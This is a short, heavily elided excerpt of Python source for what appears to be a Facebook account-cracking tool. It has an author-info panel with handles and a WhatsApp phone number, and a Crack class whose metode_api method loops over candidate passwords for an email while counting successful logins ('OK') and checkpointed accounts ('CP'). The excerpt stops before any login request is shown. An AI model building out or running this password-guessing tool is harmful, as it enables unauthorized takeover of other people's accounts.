...
class Menu:
	...
	def menu(self):
		...
		yonkou.append(Panel(f" {K2}Author   {P2}: {H2}RIZKI378\n {K2}Github  {P2} : {H2}RIZKI378\n{K2} Facebook {P2}: {H2}RIZKI378\n{K2} Whatsapp {P2}: {H2}+6283833151735",width=43,padding=(0,2),title=f"{M2}• {H2}• {K2}• {K2}Info-Author {M2}• {H2}• {K2}•",style=f"{color_panel}"))
...
class Crack:
	...
	def metode_api(self,email,pwx):
		prog.update(des,description=f" {H2}• {P2}[{H2}RIZKI378{P2}] {P2}[{P2}{str(self.loop)}{P2}/{P2}{len(tampung)}{P2}]{P2} [OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}] [")
		prog.advance(des)
		try:
			for pw in pwx:
				pw = pw.lower()
